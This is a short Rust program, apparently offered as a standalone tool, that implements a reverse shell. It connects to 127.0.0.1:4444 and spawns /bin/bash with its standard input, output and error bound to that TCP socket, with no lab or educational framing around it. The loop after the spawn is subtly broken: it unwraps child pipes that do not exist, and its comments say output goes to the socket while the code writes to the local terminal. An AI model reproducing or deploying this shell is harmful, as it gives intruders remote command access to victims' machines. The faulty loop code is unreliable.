use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> io::Result<()> {
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;

    // Redirect standard input, output, and error to the TCP stream
    let stdin = io::stdin();
    let mut stdout = io::stdout();
    let mut stderr = io::stderr();

    let mut child = Command::new("/bin/bash")
        .stdin(stream.try_clone()?)
        .stdout(stream.try_clone()?)
        .stderr(stream.try_clone()?)
        .spawn()?;

    loop {
        // Read data from the TCP stream and write it to the child process's standard input
        let mut buf = [0; 1024];
        match stream.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                child.stdin.as_mut().unwrap().write_all(&buf[0..n])?;
            }
            Err(ref e) if e.kind() == io::ErrorKind::Interrupted => {}
            Err(e) => {
                return Err(e);
            }
        }

        // Read data from the child process's standard output and write it to the TCP stream
        let mut buf = [0; 1024];
        match child.stdout.as_mut().unwrap().read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                stdout.write_all(&buf[0..n])?;
                stdout.flush()?;
            }
            Err(ref e) if e.kind() == io::ErrorKind::Interrupted => {}
            Err(e) => {
                return Err(e);
            }
        }

        // Read data from the child process's standard error and write it to the TCP stream
        let mut buf = [0; 1024];
        match child.stderr.as_mut().unwrap().read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                stderr.write_all(&buf[0..n])?;
                stderr.flush()?;
            }
            Err(ref e) if e.kind() == io::ErrorKind::Interrupted => {}
            Err(e) => {
                return Err(e);
            }
        }
    }

    Ok(())
}
